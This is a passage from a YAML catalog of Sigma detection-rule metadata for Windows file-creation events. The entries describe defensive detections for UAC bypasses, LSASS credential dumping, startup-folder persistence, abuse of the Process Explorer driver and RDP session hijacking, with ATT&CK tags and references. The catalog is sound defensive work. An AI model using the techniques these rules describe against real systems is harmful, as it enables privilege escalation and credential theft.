  description: Detects file write event from/to a fake recycle bin folder that is
    often used as a staging directory for malware
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/infected-usb-steal-secrets
  - https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 979baf41-ca44-4540-9d0c-4fcef3b5a3a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_right_to_left_override_extension_spoofing.yml
  name: Potential File Extension Spoofing Using Right-to-Left Override
  description: 'Detects suspicious filenames that contain a right-to-left override
    character and a potentially spoofed file extensions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.002
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1036.002
  time_window: ''
  references:
  - https://redcanary.com/blog/right-to-left-override/
  - https://www.malwarebytes.com/blog/news/2014/01/the-rtlo-method
  - https://tria.ge/241015-l98snsyeje/behavioral2
  - https://www.unicode.org/versions/Unicode5.2.0/ch02.pdf
  false_positives:
  - Filenames that contains scriptures such as arabic or hebrew might make use of
    this character
  notes: ''
- detection_id: ce7066a6-508a-42d3-995b-2952c65dc2ce
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_spool_drivers_color_drop.yml
  name: Drop Binaries Into Spool Drivers Color Folder
  description: Detects the creation of suspcious binary files inside the "\windows\system32\spool\drivers\color\"
    as seen in the blog referenced below
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 28208707-fe31-437f-9a7f-4b1108b94d2e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_startup_folder_persistence.yml
  name: Suspicious Startup Folder Persistence
  description: 'Detects the creation of potentially malicious script and executable
    files in Windows startup folders, which is a common persistence technique used
    by threat actors.

    These files (.ps1, .vbs, .js, .bat, etc.) are automatically executed when a user
    logs in, making the Startup folder an attractive target for attackers.

    This technique is frequently observed in malvertising campaigns and malware distribution
    where attackers attempt to maintain long-term access to compromised systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1204.002
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.t1204.002
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/last-byte/PersistenceSniper
  - https://www.microsoft.com/en-us/security/blog/2025/03/06/malvertising-campaign-leads-to-info-stealers-hosted-on-github/
  - https://github.com/redcanaryco/atomic-red-team/blob/5ede8f21e42ebe37e0a6eff757dba60bcfa85859/atomics/T1547.001/T1547.001.md
  false_positives:
  - Rare legitimate usage of some of the extensions mentioned in the rule
  notes: ''
- detection_id: 5b40a734-99b6-4b98-a1d0-1cea51a08ab2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_system_interactive_powershell.yml
  name: Suspicious Interactive PowerShell as SYSTEM
  description: Detects the creation of files that indicator an interactive use of
    PowerShell in the SYSTEM user context
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PowerSploit_Invoke-Mimikatz.htm
  false_positives:
  - Administrative activity
  - PowerShell scripts running as SYSTEM user
  notes: ''
- detection_id: 80e1f67a-4596-4351-98f5-a9c3efabac95
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_task_write.yml
  name: Suspicious Scheduled Task Write to System32 Tasks
  description: Detects the creation of tasks from processes executed from suspicious
    locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1053
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 162ab1e4-6874-4564-853c-53ec3ab8be01
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_teamviewer_remote_session.yml
  name: TeamViewer Remote Session
  description: Detects the creation of log files during a TeamViewer remote session
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.teamviewer.com/en-us/
  false_positives:
  - Legitimate uses of TeamViewer in an organisation
  notes: ''
- detection_id: 3a9fa2ec-30bc-4ebd-b49e-7c9cff225502
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_vscode_powershell_profile.yml
  name: VsCode Powershell Profile Modification
  description: Detects the creation or modification of a vscode related powershell
    profile which could indicate suspicious activity as the profile can be used as
    a mean of persistence
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.013
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.013
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.2
  false_positives:
  - Legitimate use of the profile by developers or administrators
  notes: ''
- detection_id: 1d2de8a6-4803-4fde-b85b-f58f3aa7a705
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_wdac_policy_creation.yml
  name: Potentially Suspicious WDAC Policy File Creation
  description: 'Detects suspicious Windows Defender Application Control (WDAC) policy
    file creation from abnormal processes that could be abused by attacker to block
    EDR/AV components while allowing their own malicious code to run on the system.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/deploy-appcontrol-policies-using-group-policy
  - https://beierle.win/2024-12-20-Weaponizing-WDAC-Killing-the-Dreams-of-EDR/
  - https://github.com/logangoins/Krueger/tree/main
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/appcontrol-deployment-guide
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/deploy-appcontrol-policies-with-script
  - https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/deployment/deploy-appcontrol-policies-with-memcm
  false_positives:
  - Administrators and security vendors could leverage WDAC, apply additional filters
    as needed.
  notes: ''
- detection_id: 9b64de98-9db3-4033-bd7a-f51430105f00
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_windows_terminal_profile.yml
  name: Windows Terminal Profile Settings Modification By Uncommon Process
  description: Detects the creation or modification of the Windows Terminal Profile
    settings file "settings.json" by an uncommon process.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.015
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.015
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/74438b0237d141ee9c99747976447dc884cb1a39/atomics/T1547.015/T1547.015.md#atomic-test-1---persistence-by-modifying-windows-terminal-profile
  - https://twitter.com/nas_bench/status/1550836225652686848
  false_positives:
  - Some false positives may occur with admin scripts that set WT settings.
  notes: ''
- detection_id: 34746e8c-5fb8-415a-b135-0abc167e912a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_susp_winsxs_binary_creation.yml
  name: WinSxS Executable File Creation By Non-System Process
  description: Detects the creation of binaries in the WinSxS folder by non-system
    processes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0a1255c5-d732-4b62-ac02-b5152d34fb83
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_adexplorer_dump_written.yml
  name: ADExplorer Writing Complete AD Snapshot Into .dat File
  description: Detects the dual use tool ADExplorer writing a complete AD snapshot
    into a .dat file. This can be used by attackers to extract data for Bloodhound,
    usernames for password spraying or use the meta data for social engineering. The
    snapshot doesn't contain password hashes but there have been cases, where administrators
    put passwords in the comment field.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.002
  - T1087.002
  - T1482
  tags:
  - attack.discovery
  - attack.t1087.002
  - attack.t1069.002
  - attack.t1482
  time_window: ''
  references:
  - https://learn.microsoft.com/de-de/sysinternals/downloads/adexplorer
  - https://github.com/c3c/ADExplorerSnapshot.py/tree/f700904defac330802bbfedd1d8ffd9248f4ee24
  - https://www.packetlabs.net/posts/scattered-spider-is-a-young-ransomware-gang-exploiting-large-corporations/
  - https://www.nccgroup.com/us/research-blog/lapsus-recent-techniques-tactics-and-procedures/
  - https://trustedsec.com/blog/adexplorer-on-engagements
  false_positives:
  - Legitimate use of ADExplorer by administrators creating .dat snapshots
  notes: ''
- detection_id: 814ddeca-3d31-4265-8e07-8cc54fb44903
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_livekd_default_dump_name.yml
  name: LiveKD Kernel Memory Dump File Created
  description: Detects the creation of a file that has the same name as the default
    LiveKD kernel memory dump.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - In rare occasions administrators might leverage LiveKD to perform live kernel
    debugging. This should not be allowed on production systems. Investigate and apply
    additional filters where necessary.
  notes: ''
- detection_id: 16fe46bb-4f64-46aa-817d-ff7bec4a2352
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_livekd_driver.yml
  name: LiveKD Driver Creation
  description: Detects the creation of the LiveKD driver, which is used for live kernel
    debugging
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate usage of LiveKD for debugging purposes will also trigger this
  notes: ''
- detection_id: 059c5af9-5131-4d8d-92b2-de4ad6146712
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_livekd_driver_susp_creation.yml
  name: LiveKD Driver Creation By Uncommon Process
  description: Detects the creation of the LiveKD driver by a process image other
    than "livekd.exe".
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Administrators might rename LiveKD before its usage which could trigger this.
    Add additional names you use to the filter
  notes: ''
- detection_id: de46c52b-0bf8-4936-a327-aace94f94ac6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_procexp_driver_susp_creation.yml
  name: Process Explorer Driver Creation By Non-Sysinternals Binary
  description: 'Detects creation of the Process Explorer drivers by processes other
    than Process Explorer (procexp) itself.

    Hack tools or malware may use the Process Explorer driver to elevate privileges,
    drops it to disk for a few moments, runs a service using that driver and removes
    it afterwards.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1068
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1068
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer
  - https://github.com/Yaxser/Backstab
  - https://www.elastic.co/security-labs/stopping-vulnerable-driver-attacks
  - https://news.sophos.com/en-us/2023/04/19/aukill-edr-killer-malware-abuses-process-explorer-driver/
  false_positives:
  - Some false positives may occur with legitimate renamed process explorer binaries
  notes: ''
- detection_id: a05baa88-e922-4001-bc4d-8738135f27de
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_procmon_driver_susp_creation.yml
  name: Process Monitor Driver Creation By Non-Sysinternals Binary
  description: Detects creation of the Process Monitor driver by processes other than
    Process Monitor (procmon) itself.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1068
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1068
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Some false positives may occur with legitimate renamed process monitor binaries
  notes: ''
- detection_id: 259e5a6a-b8d2-4c38-86e2-26c5e651361d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_psexec_service.yml
  name: PsExec Service File Creation
  description: Detects default PsExec service filename which indicates PsExec service
    installation and execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://www.jpcert.or.jp/english/pub/sr/ir_research.html
  - https://jpcertcc.github.io/ToolAnalysisResultSheet
  false_positives:
  - Unknown
  notes: ''
- detection_id: 304afd73-55a5-4bb9-8c21-0b1fc84ea9e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_sysinternals_psexec_service_key.yml
  name: PSEXEC Remote Execution File Artefact
  description: Detects creation of the PSEXEC key file. Which is created anytime a
    PsExec command is executed. It gets written to the file system and will be recorded
    in the USN Journal on the target system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1136.002
  - T1543.003
  - T1570
  tags:
  - attack.lateral-movement
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1136.002
  - attack.t1543.003
  - attack.t1570
  - attack.s0029
  time_window: ''
  references:
  - https://aboutdfir.com/the-key-to-identify-psexec/
  - https://twitter.com/davisrichardg/status/1616518800584704028
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 07a99744-56ac-40d2-97b7-2095967b0e03
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_system32_local_folder_privilege_escalation.yml
  name: Potential Privilege Escalation Attempt Via .Exe.Local Technique
  description: Detects potential privilege escalation attempt via the creation of
    the "*.Exe.Local" folder inside the "System32" directory in order to sideload
    "comctl32.dll"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://github.com/binderlabs/DirCreate2System
  - https://github.com/sailay1996/awesome_windows_logical_bugs/blob/60cbb23a801f4c3195deac1cc46df27c225c3d07/dir_create2system.txt
  false_positives:
  - Unknown
  notes: ''
- detection_id: 69ca12af-119d-44ed-b50f-a47af0ebc364
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_taskmgr_lsass_dump.yml
  name: LSASS Process Memory Dump Creation Via Taskmgr.EXE
  description: Detects the creation of an "lsass.dmp" file by the taskmgr process.
    This indicates a manual dumping of the LSASS.exe process memory using Windows
    Task Manager.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/987e3ca988ae3cff4b9f6e388c139c05bf44bbb8/atomics/T1003.001/T1003.001.md#L1
  false_positives:
  - Rare case of troubleshooting by an administrator or support that has to be investigated
    regardless
  notes: ''
- detection_id: 52753ea4-b3a0-4365-910d-36cff487b789
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_tsclient_filewrite_startup.yml
  name: Hijack Legit RDP Session to Move Laterally
  description: Detects the usage of tsclient share to place a backdoor on the RDP
    source machine's startup folder
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 62ed5b55-f991-406a-85d9-e8e8fdf18789
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_consent_comctl32.yml
  name: UAC Bypass Using Consent and Comctl32 - File
  description: Detects the pattern of UAC Bypass using consent.exe and comctl32.dll
    (UACMe 22)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 93a19907-d4f9-4deb-9f91-aac4692776a6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_dotnet_profiler.yml
  name: UAC Bypass Using .NET Code Profiler on MMC
  description: Detects the pattern of UAC Bypass using .NET Code Profiler and mmc.exe
    DLL hijacking (UACMe 39)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 63e4f530-65dc-49cc-8f80-ccfa95c69d43
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_eventvwr.yml
  name: UAC Bypass Using EventVwr
  description: Detects the pattern of a UAC bypass using Windows Event Viewer
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://twitter.com/orange_8361/status/1518970259868626944?s=20&t=RFXqZjtA7tWM3HxqEH78Aw
  - https://twitter.com/splinter_code/status/1519075134296006662?s=12&t=DLUXH86WtcmG_AZ5gY3C6g
  - https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/#execute
  false_positives:
  - Unknown
  notes: ''
- detection_id: 48ea844d-19b1-4642-944e-fe39c2cc1fec
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_idiagnostic_profile.yml
  name: UAC Bypass Using IDiagnostic Profile - File
  description: Detects the creation of a file by "dllhost.exe" in System32 directory
    part of "IDiagnosticProfileUAC" UAC bypass technique
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1548.002
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/Wh04m1001/IDiagnosticProfileUAC
  false_positives:
  - Unknown
  notes: ''
- detection_id: bdd8157d-8e85-4397-bb82-f06cc9c71dbb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_ieinstal.yml
  name: UAC Bypass Using IEInstal - File
  description: Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 41bb431f-56d8-4691-bb56-ed34e390906f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_msconfig_gui.yml
  name: UAC Bypass Using MSConfig Token Modification - File
  description: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe
    55)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7fff6773-2baa-46de-a24a-b6eec1aba2d1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_ntfs_reparse_point.yml
  name: UAC Bypass Using NTFS Reparse Point - File
  description: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe
    DLL hijacking (UACMe 36)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 155dbf56-e0a4-4dd0-8905-8a98705045e8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_winsat.yml
  name: UAC Bypass Abusing Winsat Path Parsing - File
  description: Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe
    (UACMe 52)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 68578b43-65df-4f81-9a9b-92f32711a951
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_uac_bypass_wmp.yml
  name: UAC Bypass Using Windows Media Player - File
  description: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll
    (UACMe 32)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/hfiref0x/UACME
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8468111a-ef07-4654-903b-b863a80bbc95
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_vhd_download_via_browsers.yml
  name: VHD Image Download Via Browser
  description: 'Detects creation of ".vhd"/".vhdx" files by browser processes.

    Malware can use mountable Virtual Hard Disk ".vhd" files to encapsulate payloads
    and evade security controls.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1587.001
  tags:
  - attack.resource-development
  - attack.t1587.001
  time_window: ''
  references:
  - https://redcanary.com/blog/intelligence-insights-october-2021/
  - https://www.kaspersky.com/blog/lazarus-vhd-ransomware/36559/
  - https://securelist.com/lazarus-on-the-hunt-for-big-game/97757/
  false_positives:
  - Legitimate downloads of ".vhd" files would also trigger this
  notes: ''
- detection_id: 56e05d41-ce99-4ecd-912d-93f019ee0b71
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_vscode_tunnel_remote_creation_artefacts.yml
  name: Visual Studio Code Tunnel Remote File Creation
  description: 'Detects the creation of file by the "node.exe" process in the ".vscode-server"
    directory. Could be a sign of remote file creation via VsCode tunnel feature

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.command-and-control
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: d102b8f5-61dc-4e68-bd83-9a3187c67377
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/file/file_event/file_event_win_vscode_tunnel_renamed_execution.yml
  name: Renamed VsCode Code Tunnel Execution - File Indicator
